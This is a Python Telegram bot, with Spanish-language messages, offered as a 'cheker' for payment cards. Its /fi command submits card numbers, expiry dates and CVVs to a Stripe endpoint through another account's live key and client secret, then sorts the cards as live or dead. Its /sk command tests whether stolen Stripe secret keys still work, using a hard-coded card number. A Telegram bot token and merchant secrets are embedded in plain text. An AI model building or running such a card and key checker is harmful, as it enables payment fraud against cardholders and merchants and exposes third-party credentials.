import logging
import os
import requests
import json
import time
import string
import random

from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup

comand = "/.,*+"


bot = bool(os.environ.get('bot', True))
token = os.environ.get("token", None)

bot = Bot(token="6055899490:AAEfy1wViQ54O62uJL6tmVfOK8co88GQjvE", parse_mode=types.ParseMode.HTML)
iniciar = Dispatcher(bot)



@iniciar.message_handler(commands=['start'], commands_prefix=comand)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    await message.reply (
        """
bienvenido este es un bot-cheker para textiar bins y ccs❌. 
para ver su lista de comando escriba: /cmds ✅✅✅

        """
    )


@iniciar.message_handler(commands=['cmds'], commands_prefix=comand)
async def helpstr(message: types.Message):
    await message.reply (
        """
lista de comandos:   

/start -para iniciar ✅
/cmds -para la lista de comandos ⚜️
/bin -para testiar ccs 🔰

        """
    )


@iniciar.message_handler(commands=['bin'], commands_prefix=comand)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    BIN = message.text[len("/bin "): 11]
    if len(BIN) < 6:
        return await message.reply("<b>Lo siento acabas de ingresar el bin de forma incorrecta /bin 422345</b>")
    if not BIN:
        return await message.reply("Did u Really Know how to use me.")
    apis = requests.get(f"https://bins-su-ani.vercel.app/api/{BIN}").json()

    result=apis['result']
    msg=apis['message']
    data=apis['data']
    vendor=data['vendor']
    bn=data['bin']
    typ=data['type']
    lv=data['level']
    bank=data['bank']
    country=data['country']
    countryinfo=data['countryInfo']
    name=countryinfo['name']
    emoji=countryinfo['emoji']
    cd=countryinfo['code']
    dialCode=countryinfo['dialCode']

    await message.reply (f"""
<b> ♦️ INFO BINS
‗‗‗‗‗‗‗❈❈‗‗‗‗‗‗‗

✦RESULTADO  : {result}
✦BIN : ¨{bn}
✦VENDOR : {vendor}
✦TYPE : {typ}
✦LEVEL : {lv}
✦BANK : {bank}
✦COUNTRY : {country}
✦NAME : {name}
✦EMOJI : {emoji}
✦CODE : {cd}
✦DIALCODE : {dialCode}</b>
""")




@iniciar.message_handler(commands=['fi'], commands_prefix=comand)
async def helpstr(message: types.Message):
    ini = time.perf_counter()
    ccs = message.text[len('/st '):]

    if not ccs:
           await message.reply("/fi cc|mm|aa")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]
    
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-ES,es;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',}
    data = f'payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=640c5960-e207-4041-8ac5-e50956563a19b896d0&payment_method_data[muid]=966625ff-a525-4d57-a0e6-f8acf08b2ea036c4d6&payment_method_data[sid]=45b106fb-6c39-49a6-9bc3-faa07e2e8f83eb274b&payment_method_data[pasted_fields]=number%2Ccvc&payment_method_data[payment_user_agent]=stripe.js%2F0d3c53128%3B+stripe-js-v3%2F0d3c53128&payment_method_data[time_on_page]=87982&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_DImPqz7QOOyx70XCA9DSifxb&_stripe_account=acct_1CQeZLEr6nD8LE6p&client_secret=seti_1MIwYIEr6nD8LE6pP1XbDd0T_secret_N32dsyoCEP1pn4Vwyp0EVpc8dJD4kzS'
    
    response = requests.post(
    'https://api.stripe.com/v1/setup_intents/seti_1MIwYIEr6nD8LE6pP1XbDd0T/confirm',
    headers=headers,
    data=data,
    ).json()

    error=response['error']
    code=error['code']
    messag=error['message']
    if 'incorrect_cvc' in code:
        await message.reply(f"""<b>
CCN LIVE ✅

CC: <code>{ccs}</code>
Code : {code}
Response : {messag}
        </b>
        """)
    elif 'card_declined' in code:
        await message.reply(f"""<b>
CC DEAD ❌

CC: <code>{ccs}</code>
Code : card_declined
Response : decline_code
        </b>
        
        """)
    else:
        await message.reply(f"""<b>
CVV LIVE ✅

CC: <code>{ccs}</code>
Code : Aprovado
Response : Aproved</b>""")





@iniciar.message_handler(commands=['sk'], commands_prefix=comand)
async def helpstr(message: types.Message):
    skkey = message.text[len('/sk '):]
    if not skkey:
        return await message.reply(
            f"""
<b>Ingresar correctamente el valor</b>: <code>/sk sk_live_51Gnxxxxxxxxxxxxxxxxxxxxxxxxxxhrh8</code>

<b><a href="tg://user?id={message.chat.id}">𝗡 𝗜 𝗞 𝗜 ㅤ𝗖𝗖 𝗕𝗢𝗧</a></b>

""")
    cc= "4543218722787334"
    cvc= "780"
    mes= "07"
    ano= "2026"

    headers={
    "Content-Type": "application/x-www-form-urlencoded"
    }

    data={
    "card[number]": cc,
    "card[cvc]": cvc,
    "card[exp_month]": mes,
    "card[exp_year]": ano
    }

    pos = requests.post(f"https://api.stripe.com/v1/tokens",
        data=data, headers=headers, auth=(skkey, ""))
    if 'Invalid API Key provided' in pos.text:
        await message.reply(f"""
<b>DEAD ❌
{skkey}
Response: Invalid API Key provided</b>
    """)
    elif 'api_key_expired' in pos.text:
        await message.reply(f"""
<b>DEAD ❌
{skkey}
Response: api_key_expired</b>""")
    elif 'testmode_charges_only' in pos.text:
        await message.reply(f"""
<b>DEAD ❌
{skkey}
Response: testmode_charges_only</b>""")
    elif 'test_mode_live_card' in pos.text:
        await message.reply(f"""
<b>DEAD ❌
{skkey}
Response: test_mode_live_card</b>""")
    else:
        await message.reply(f"""
<b>LIVE ✅</b>
<code><b>{skkey}</b></code>
<b>Reason: Sk_Live!</b>""")



















print("CODIGO EN LINEA")
logging.basicConfig(level=logging.INFO)

if __name__ == '__main__':
    executor.start_polling(iniciar, skip_updates=True)
